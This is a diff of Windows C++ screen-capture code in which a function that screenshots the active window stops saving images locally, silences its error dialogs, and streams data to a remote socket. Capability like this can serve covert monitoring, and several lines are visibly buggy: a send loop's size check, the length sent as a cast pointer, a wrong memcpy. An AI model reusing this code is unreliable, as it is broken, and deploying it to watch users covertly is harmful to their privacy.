@@ -253,7 +253,9 @@ int CaptureAnImage(HWND active)
 		0, 0,
 		SRCCOPY))
 	{
-		MessageBox(hWnd, L"BitBlt has failed", L"Failed", MB_OK);
+		//MessageBox(hWnd, L"BitBlt has failed", L"Failed", MB_OK);
+		int a = GetLastError();
+		//For error checking. Some strange error occurs here after long runtime, not sure of the reason. May be server side.
 		goto done;
 	}
 	if (!hbmActive)
@@ -261,7 +263,7 @@ int CaptureAnImage(HWND active)
 		MessageBox(hWnd, L"CreateCompatibleBitmap Failed", L"Failed", MB_OK);
 		goto done;
 	}
-	CreateDirectory(L"pictures", NULL);
+	//CreateDirectory(L"pictures", NULL);
 	wchar_t titley[100];
 	wchar_t title[100];
 	GetWindowText(active, titley, 50);
@@ -279,7 +281,7 @@ int CaptureAnImage(HWND active)
 	CLSID *jpgclsid = new CLSID;
 	GetEncoderClsid(L"image/jpeg", jpgclsid);
 	Gdiplus::Bitmap* sah = Gdiplus::Bitmap::FromHBITMAP(hbmActive, NULL);
-	sah->Save(title, jpgclsid, 0);
+	//sah->Save(title, jpgclsid, 0);
 	//sah->Save(youStream, jpgclsid, 0);
 	//Above two lines are for the iStream implementation.
 	//Below is the network socket implementation.
@@ -319,8 +321,22 @@ int CaptureAnImage(HWND active)
 	//	count += send(ConnectSocket, &buf[count], strlen(buf)-count, NULL);
 	//}
 	free(buf);
-
+	/*
+	count = 0;
+	char* bufx = (char*)malloc(sizeof(hWnd)+1);
+	memcpy(&bufx, hWnd, sizeof(hWnd));
+	//loop while there is more data:
+	//Send hWnd as unique identifier
+	while (count < sizeof(hWnd)) {
+		count += send(ConnectSocket, bufx, sizeof(hWnd), NULL);
+	}
+	free(bufx);
+	*/
 	//Send 2 newlines
+	count = 0;
+	while (count < sizeof("\n\n")) {
+		count += send(ConnectSocket, "\n\n", 2, NULL);
+	}
 	
 	len = (char*)full.LowPart;
 	send(ConnectSocket, len, sizeof(len), NULL);
